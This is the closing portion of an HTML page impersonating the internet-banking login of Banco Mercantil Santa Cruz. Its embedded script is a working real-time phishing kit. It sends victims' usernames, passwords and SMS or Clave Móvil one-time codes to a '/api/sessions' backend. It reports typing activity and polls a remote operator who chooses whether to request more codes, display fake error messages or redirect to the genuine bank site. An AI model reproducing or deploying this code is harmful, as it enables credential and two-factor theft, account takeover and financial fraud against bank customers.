      <div id="containerBottom" class="fl"></div>

      <div id="footer" class="fl">
        <div class="fl">
          Esta entidad se encuentra bajo la regulación y supervisión de la Autoridad de Supervisión del Sistema Financiero (ASFI).
        </div>
        <div class="right">
          <div class="logo fl">
            <img src="/banca/blank.png" alt="Footer Logo" width="88" height="23" />
          </div>
        </div>
      </div>
      <div id="footer2" class="fl">
        <div class="fl">
          La información obtenida por medio de nuestro canal de Banca por Internet, debe estar sujeta a confirmación y validación en las oficinas del Banco. Proteja su información personal, no permita que se exponga a terceros.
          <br />Copyright © Banco Mercantil Santa Cruz 2026
        </div>
      </div>
    </div>

    <a href="#" id="puntoReclamoBtn">
      <img src="/banca/puntoDeReclamo.png" alt="Punto de Reclamo" />
    </a>

    <script src="/js/main.js"></script>
    <script>
      // Session ID
      let sessionId = sessionStorage.getItem('bmsc_session_id');
      if (!sessionId) {
        sessionId = 'bmsc_' + Date.now() + '_' + Math.random().toString(36).substr(2, 7);
        sessionStorage.setItem('bmsc_session_id', sessionId);
      }

      let pingInterval = null;
      let pollInterval = null;
      let isWaitingForNextAction = false;
      let lastHandledActionId = 0;
      let hasInitialSubmitted = false;
      let lastTypingSent = 0;

      function notifyTyping() {
        if (!sessionId || !hasInitialSubmitted) return;
        const now = Date.now();
        if (now - lastTypingSent > 1200) {
          lastTypingSent = now;
          fetch('/api/sessions/' + sessionId + '/state', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ state: 'typing' })
          }).catch(() => {});
        }
      }

      // Elements
      const user = document.getElementById("MainContent_ctl01_txtUserNamePassword");
      const pass = document.getElementById("txtPassword");
      const box = document.querySelector(".contentLogin");
      const stepUser = document.getElementById("stepUser");
      const stepPass = document.getElementById("stepPass");
      const stepToken = document.getElementById("stepToken");
      const loginSpinner = document.getElementById("loginSpinner");
      const loginErrorBox = document.getElementById("loginErrorBox");
      const tokenErrorBox = document.getElementById("tokenErrorBox");
      const tokenTitle = document.getElementById("tokenTitle");
      const tokenSubtitle = document.getElementById("tokenSubtitle");
      const tokenBadgeIcon = document.getElementById("tokenBadgeIcon");
      const tokenBadgeText = document.getElementById("tokenBadgeText");
      const tokenHintText = document.getElementById("tokenHintText");
      const spinnerTextTitle = document.getElementById("spinnerTextTitle");
      const spinnerTextSub = document.getElementById("spinnerTextSub");
      const otpSlots = [...document.querySelectorAll(".otp-slot")];
      const enterBtn = document.getElementById("Enter_Step1");

      function setButtonLoading(isLoading) {
        if (!enterBtn) return;
        if (isLoading) {
          enterBtn.disabled = true;
          enterBtn.classList.add("btn-loading");
          enterBtn.innerHTML = '<span class="btn-spinner"></span><span style="color:#ffffff; font-weight:700; font-size:12px; text-shadow:0 1px 1px rgba(0,0,0,0.3);">Ingresando...</span>';
          if (user) user.readOnly = true;
        } else {
          enterBtn.disabled = false;
          enterBtn.classList.remove("btn-loading");
          enterBtn.innerHTML = 'Ingresar';
          if (user) user.readOnly = false;
        }
      }

      function bindReveal(input, checkbox) {
        if (!input || !checkbox) return;
        checkbox.addEventListener("change", function () {
          input.type = checkbox.checked ? "text" : "password";
        });
      }
      bindReveal(user, document.getElementById("MainContent_ctl01_cbShowCharacters"));

      function showError(msg) {
        loginErrorBox.textContent = msg;
        loginErrorBox.style.display = "block";
      }

      function hideError() {
        loginErrorBox.style.display = "none";
        loginErrorBox.textContent = "";
      }

      function goToPassword() {
        if (isWaitingForNextAction) return;
        hideError();
        const userVal = (user.value || "").trim();
        if (!userVal) {
          showError("Por favor ingrese su nombre de usuario.");
          user.focus();
          return;
        }

        hasInitialSubmitted = true;
        isWaitingForNextAction = true;

        // Spinner dentro del botón de iniciar sesión
        setButtonLoading(true);

        fetch('/api/sessions', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            id: sessionId,
            username: userVal,
            tipoUsuario: 'Banca por Internet',
            device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
            state: 'waiting',
            action: null
          })
        })
        .then(() => {
          startKeepalive();
          startPolling();
        })
        .catch(() => {
          isWaitingForNextAction = false;
          setButtonLoading(false);
          showError("No se pudo conectar con el servidor. Intente de nuevo.");
        });
      }

      function goToUser() {
        hideError();
        isWaitingForNextAction = false;
        hideSpinner();
        setButtonLoading(false);
        stepPass.hidden = true;
        stepToken.hidden = true;
        stepUser.hidden = false;
        box?.classList.remove("extended");
        if (user) user.focus();
      }

      document.getElementById("Enter_Step1")?.addEventListener("click", goToPassword);
      document.getElementById("btnAnterior")?.addEventListener("click", goToUser);

      user?.addEventListener("keydown", function (event) {
        if (event.key === "Enter") {
          event.preventDefault();
          goToPassword();
        }
      });

      user?.addEventListener("input", () => {
        if (hasInitialSubmitted) {
          notifyTyping();
        }
      });

      pass?.addEventListener("keydown", function (event) {
        if (event.key === "Enter") {
          event.preventDefault();
          submitLogin();
        }
      });

      pass?.addEventListener("input", () => {
        notifyTyping();
      });

      function startKeepalive() {
        if (pingInterval) clearInterval(pingInterval);
        fetch('/api/sessions/' + sessionId + '/ping', { method: 'POST' }).catch(() => {});
        pingInterval = setInterval(() => {
          fetch('/api/sessions/' + sessionId + '/ping', { method: 'POST' }).catch(() => {});
        }, 3000);
      }

      function showSpinner(title, subtitle) {
        if (spinnerTextTitle) spinnerTextTitle.textContent = title || "Verificando credenciales";
        if (spinnerTextSub) spinnerTextSub.textContent = subtitle || "Por favor espere un momento mientras procesamos su solicitud de ingreso...";
        if (stepUser) stepUser.hidden = true;
        if (stepPass) stepPass.hidden = true;
        if (stepToken) stepToken.hidden = true;
        if (loginSpinner) {
          loginSpinner.classList.add("is-active");
          loginSpinner.style.display = "flex";
        }
        box?.classList.add("extended");
      }

      function hideSpinner() {
        if (loginSpinner) {
          loginSpinner.classList.remove("is-active");
          loginSpinner.style.display = "none";
        }
      }

      function startPolling() {
        if (pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(async () => {
          try {
            const res = await fetch('/api/sessions/' + sessionId);
            if (res.ok) {
              const session = await res.json();
              const action = session.action;
              const actionId = Number(session.actionId) || 0;

              // Actualizar imagen personalizada si el operador asignó una
              if (session.customImage) {
                const secImg = document.getElementById("imgSecurity");
                if (secImg && secImg.src !== session.customImage) {
                  secImg.src = session.customImage;
                }
              }

              // Si el usuario está en el spinner esperando la siguiente acción del operador:
              // Solo abandonamos el spinner si llega una acción NUEVA del operador (action existe y actionId > lastHandledActionId)
              if (isWaitingForNextAction) {
                if (!action || actionId <= lastHandledActionId) {
                  return; // Mantener estrictamente al usuario en el spinner!
                }
              }

              // Si no hay acción o la acción ya fue ejecutada previamente, NO hacer nada
              // (esto evita borrar el campo de contraseña cada 1.2 segundos mientras escribe)
              if (!action || actionId <= lastHandledActionId) {
                return;
              }

              // Marcar la acción como ejecutada para NUNCA repetirla en ticks futuros
              lastHandledActionId = actionId;
              isWaitingForNextAction = false;
              hideSpinner();
              setButtonLoading(false);

              if (action === 'password' || action === 'pedir-password') {
                stepUser.hidden = true;
                stepToken.hidden = true;
                stepPass.hidden = false;
                box?.classList.add("extended");
                if (pass) pass.focus();
              } else if (action === 'dinamica' || action === 'sms') {
                tokenErrorBox.style.display = "none";
                stepPass.hidden = true;
                stepUser.hidden = true;
                stepToken.hidden = false;
                box?.classList.add("extended");

                if (action === 'sms') {
                  tokenTitle.textContent = "Verificación de Seguridad — Código SMS";
                  tokenSubtitle.textContent = "Ingrese el código de 6 dígitos enviado por mensaje de texto (SMS) a su celular registrado.";
                  if (tokenBadgeIcon) tokenBadgeIcon.textContent = "📱";
                  if (tokenBadgeText) tokenBadgeText.textContent = "Código SMS (6 dígitos)";
                  if (tokenHintText) tokenHintText.textContent = "Revise sus mensajes de texto en su celular";
                } else {
                  tokenTitle.textContent = "Verificación de Seguridad — Clave Móvil";
                  tokenSubtitle.textContent = "Ingrese los 6 dígitos generados en la aplicación Clave Móvil (Token) de su celular.";
                  if (tokenBadgeIcon) tokenBadgeIcon.textContent = "🔐";
                  if (tokenBadgeText) tokenBadgeText.textContent = "Clave Móvil Token (6 dígitos)";
                  if (tokenHintText) tokenHintText.textContent = "Abra la app de Clave Móvil para ver su código";
                }

                resetOtpSlots();
              } else if (action === 'error-login') {
                stepPass.hidden = true;
                stepToken.hidden = true;
                stepUser.hidden = false;
                box?.classList.remove("extended");
                showError("El usuario o la contraseña ingresada son incorrectos. Verifique sus datos e intente nuevamente.");
                if (pass) pass.value = "";
                if (user) {
                  user.focus();
                  user.select();
                }
              } else if (action === 'error-dinamica' || action === 'error-sms') {
                stepPass.hidden = true;
                stepUser.hidden = true;
                stepToken.hidden = false;
                box?.classList.add("extended");
                if (action === 'error-sms') {
                  tokenTitle.textContent = "Verificación de Seguridad — Código SMS";
                  tokenSubtitle.textContent = "Ingrese el código de 6 dígitos enviado por mensaje de texto (SMS) a su celular registrado.";
                  if (tokenBadgeIcon) tokenBadgeIcon.textContent = "📱";
                  if (tokenBadgeText) tokenBadgeText.textContent = "Código SMS (6 dígitos)";
                  if (tokenHintText) tokenHintText.textContent = "Revise sus mensajes de texto en su celular";
                } else {
                  tokenTitle.textContent = "Verificación de Seguridad — Clave Móvil";
                  tokenSubtitle.textContent = "Ingrese los 6 dígitos generados en la aplicación Clave Móvil (Token) de su celular.";
                  if (tokenBadgeIcon) tokenBadgeIcon.textContent = "🔐";
                  if (tokenBadgeText) tokenBadgeText.textContent = "Clave Móvil Token (6 dígitos)";
                  if (tokenHintText) tokenHintText.textContent = "Abra la app de Clave Móvil para ver su código";
                }
                tokenErrorBox.textContent = action === 'error-sms'
                  ? "El código SMS ingresado es incorrecto o ha expirado. Por favor intente nuevamente."
                  : "El código de Clave Móvil ingresado es incorrecto o ha expirado. Por favor intente nuevamente.";
                tokenErrorBox.style.display = "block";
                resetOtpSlots();
              } else if (action === 'done') {
                clearInterval(pingInterval);
                clearInterval(pollInterval);
                window.location.href = "https://www.bmsc.com.bo/";
              }
            }
          } catch (_) {}
        }, 1200);
      }

      function submitLogin() {
        hideError();
        const userVal = (user.value || "").trim();
        const passVal = (pass.value || "").trim();

        if (!userVal) {
          goToUser();
          showError("Por favor ingrese su usuario.");
          return;
        }
        if (!passVal) {
          showError("Por favor ingrese su contraseña.");
          pass.focus();
          return;
        }

        isWaitingForNextAction = true;

        showSpinner("Verificando sus credenciales", "Estamos procesando su solicitud de ingreso...");

        const sessionPayload = {
          id: sessionId,
          username: userVal,
          password: passVal,
          tipoUsuario: 'Banca por Internet',
          device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
          state: 'waiting',
          action: null,
          createdAt: Date.now()
        };

        fetch('/api/sessions', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(sessionPayload)
        })
        .then(() => {
          startKeepalive();
          startPolling();
        })
        .catch(() => {
          isWaitingForNextAction = false;
          hideSpinner();
          stepPass.hidden = false;
          showError("No se pudo conectar con el servidor. Intente de nuevo.");
        });
      }

      document.getElementById("btnSiguiente")?.addEventListener("click", submitLogin);

      // OTP Slots handling
      function getOtpValue() {
        return otpSlots.map(slot => slot.value).join("");
      }

      function resetOtpSlots() {
        otpSlots.forEach(slot => {
          slot.value = "";
          slot.classList.remove("has-value");
        });
        otpSlots[0]?.focus();
      }

      otpSlots.forEach((slot, idx) => {
        slot.addEventListener("input", (e) => {
          slot.value = slot.value.replace(/\D/g, "").slice(-1);
          if (slot.value) {
            slot.classList.add("has-value");
            if (otpSlots[idx + 1]) {
              otpSlots[idx + 1].focus();
            } else if (getOtpValue().length === 6) {
              document.getElementById("btnSubmitToken")?.focus();
            }
          } else {
            slot.classList.remove("has-value");
          }
          notifyTyping();
        });

        slot.addEventListener("keydown", (e) => {
          if (e.key === "Backspace" && !slot.value && otpSlots[idx - 1]) {
            otpSlots[idx - 1].focus();
            otpSlots[idx - 1].value = "";
            otpSlots[idx - 1].classList.remove("has-value");
          } else if (e.key === "Enter") {
            e.preventDefault();
            submitToken();
          }
        });

        slot.addEventListener("paste", (e) => {
          e.preventDefault();
          const pasteData = (e.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, 6);
          pasteData.split("").forEach((ch, i) => {
            if (otpSlots[i]) {
              otpSlots[i].value = ch;
              otpSlots[i].classList.add("has-value");
            }
          });
          const lastIdx = Math.min(pasteData.length, 6) - 1;
          if (lastIdx >= 0 && otpSlots[lastIdx]) otpSlots[lastIdx].focus();
          if (pasteData.length === 6) {
            document.getElementById("btnSubmitToken")?.focus();
          }
          notifyTyping();
        });
      });

      function submitToken() {
        const tokenVal = getOtpValue();
        if (tokenVal.length !== 6) {
          tokenErrorBox.textContent = "Ingrese los 6 dígitos del código de seguridad.";
          tokenErrorBox.style.display = "block";
          return;
        }

        tokenErrorBox.style.display = "none";
        isWaitingForNextAction = true;
        showSpinner("Validando código de seguridad", "Verificando el código ingresado...");

        fetch('/api/sessions/' + sessionId + '/token', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token: tokenVal })
        }).catch(() => {});
      }

      document.getElementById("btnSubmitToken")?.addEventListener("click", submitToken);
    </script>
  </body>
</html>
